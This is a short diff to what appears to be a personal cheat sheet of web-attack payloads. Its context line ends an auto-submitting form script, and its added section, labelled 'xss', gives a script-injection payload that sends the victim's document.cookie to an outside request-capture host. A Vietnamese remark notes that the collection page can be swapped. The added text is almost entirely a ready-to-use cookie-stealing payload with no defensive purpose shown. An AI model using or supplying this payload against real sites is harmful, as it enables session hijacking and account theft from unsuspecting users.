@@ -101,3 +101,11 @@ document.forms["profile"].submit(); //auto submit form
 </script>
 
 ```
+
+--------------- xss
+```
+abc.com/hello.php//
+"><script language= "JavaScript">
+document.location="https://requestb.in/1fwk51x1?cookie=" + document.cookie;</script>
+```
+có thể thay trang chứa steal cookie =request.in
